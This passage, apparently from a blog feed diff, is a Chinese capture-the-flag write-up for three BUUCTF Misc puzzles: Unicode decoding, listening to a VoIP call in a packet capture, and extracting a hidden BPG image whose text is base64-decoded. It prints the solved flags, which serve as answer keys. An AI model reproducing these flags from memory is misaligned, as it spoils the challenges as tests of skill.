+<p><code>\u0034\u0030\u0037\u0030\u000d\u000a\u0031\u0032\u0033\u0034\u000d\u000a</code></p>
+<p>unicode解码得到</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174925-skni7fq.png"></p>
+<p>经过尝试，把两个数字相加，出题人鬼才，得到flag{5304}</p>
+<h2 id="BUUCTF-voip"><a href="#BUUCTF-voip" class="headerlink" title="BUUCTF voip"></a>BUUCTF voip</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>流量包分析</li>
+<li>voip通话</li>
+</ul>
+<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>打开流量包</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323184625-tpa6e7y.png"></p>
+<p>在voip通话之中有英语听力，flag就在里面。考听力。</p>
+<p> flag{9001IVR}</p>
+<h2 id="BUUCTF-Business-Planning-Group"><a href="#BUUCTF-Business-Planning-Group" class="headerlink" title="BUUCTF Business Planning Group"></a>BUUCTF Business Planning Group</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li>BPG图片</li>
+<li>图片隐写</li>
+<li>base64编码</li>
+</ul>
+<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>得到图片</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/challenge-20220323191325-4k6iank.png"></p>
+<p>用binwalk、foremost 也没得到有用的信息。</p>
+<p>在010查看发现文件尾有个BPG</p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323192137-vmw1qbm.png"></p>
+<p><strong>维基百科</strong></p>
+<p><strong>BPG</strong>格式，全称“<strong>Better Portable Graphics</strong>”（更好的便携式图像），它是一个声称比现时最流行的<a href="https://zh.wikipedia.org/wiki/JPEG" title="JPEG">JPEG</a>压缩格式更优秀的<a href="https://zh.wikipedia.org/wiki/%E5%9B%BE%E5%83%8F%E5%8E%8B%E7%BC%A9" title="图像压缩">图像压缩</a>方案，由法国的程序员<a href="https://zh.wikipedia.org/wiki/%E6%B3%95%E5%B8%83%E9%87%8C%E6%96%AF%C2%B7%E8%B4%9D%E6%8B%89" title="法布里斯·贝拉">法布里斯·贝拉</a>（Fabrice Bellard）于2014年创建。他将影像编码格式中的技术运用到了图像编码，以达至更理想的压缩比率，而不同于<a href="https://zh.wikipedia.org/wiki/JPEG" title="JPEG">JPEG</a>为提高压缩比而牺牲画质的方式 ^<a href="https://zh.wikipedia.org/wiki/BPG#cite_note-bellard-1">[1]</a>^^<a href="https://zh.wikipedia.org/wiki/BPG#cite_note-techbang-2">[2]</a>^ 。该影像编码格式基于<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E6%95%88%E7%8E%87%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81" title="高效率视频编码">高效率视频编码</a>（HEVC）的<a href="https://zh.wikipedia.org/wiki/%E5%B9%80%E5%85%A7%E7%B7%A8%E7%A2%BC" title="帧内编码">帧内编码</a>技术改良而成。</p>
+<p><strong>BPG (Better Portable Graphics)</strong> 是一个新的图片格式，目的是保证质量或者文件大小限制的情况下替换 JPEG 格式，主要特性：</p>
+<ul>
+<li>高压缩率</li>
+<li>支持大部分 Web 浏览器，带有一个小的 JavaScript 解码器 (gzipped size: 56 KB).</li>
+<li>基于 <a href="http://en.wikipedia.org/wiki/High_Efficiency_Video_Coding">HEVC</a> 开放视频压缩标准的子集</li>
+<li>支持跟 JPEG 的相同色度(grayscale, YCbCr 4:2:0, 4:2:2, 4:4:4) ，降低转换损失</li>
+<li>原生支持每通道 8 到 14 位，更好的动态范围</li>
+<li>支持无损压缩</li>
+<li>各种元数据</li>
+<li>支持动态</li>
+</ul>
+<p>正常windows没有办法识别BPG</p>
+<p>用工具：<a href="https://bellard.org/bpg/bpg-0.9.8-win64.zip">https://bellard.org/bpg/bpg-0.9.8-win64.zip</a></p>
+<p>命令：<code>.\bpgview.exe .\1.bpg</code></p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323193906-tlc0e0a.png"></p>
+<p><code>YnNpZGVzX2RIbGhpe0JQR19pNV9iM3R0M3JfN2g0bl9KUEd9Cg==</code></p>
+<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323194144-o0hlquy.png"></p>
+<p>bsides_dHlhi{BPG_i5_b3tt3r_7h4n_JPG}</p>
+]]></content>
+      <categories>
+        <category>BUUCTF(Misc)</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
       </tags>
   </entry>
   <entry>
